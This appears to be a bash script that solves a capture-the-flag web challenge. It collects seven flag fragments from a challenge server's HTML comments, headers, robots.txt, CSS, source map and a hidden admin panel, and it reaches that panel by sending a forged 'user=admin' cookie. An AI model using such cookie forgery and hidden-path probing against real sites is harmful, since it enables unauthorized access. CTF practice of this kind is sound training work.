#!/bin/bash

flag1=$(curl http://34.150.251.3:3000 -s | grep "part 1" | awk -F ':|-->' '{print $2}' | xargs)
flag2=$(curl http://34.150.251.3:3000 -s -I | grep "Part2" | awk -F ': ' '{print $2}'| xargs)
flag3=$(curl http://34.150.251.3:3000/hidden_admin_panel -s -I | grep "part3" | awk -F '=|;' '{print $2}' | xargs)
flag4=$(curl http://34.150.251.3:3000/robots.txt -s | grep "part4" | awk -F '=' '{print $2}'|xargs)
flag5=$(curl http://34.150.251.3:3000/styles.css -s | grep "p_a_r_t_f_i_v_e" | awk -F '=|*/' '{print $2}' | xargs)
flag6=$(curl http://34.150.251.3:3000/hidden_admin_panel -H "Cookie: user=admin" -s | grep "Part 6" |awk -F 'flag">|</span' '{print $2}'| xargs)
flag7=$(curl http://34.150.251.3:3000/app.min.js.map -s | jq -r '.part7' | xargs)

echo part1: $flag1
echo part2: $flag2
echo part3: $flag3
echo part4: $flag4
echo part5: $flag5
echo part6: $flag6
echo part7: $flag7
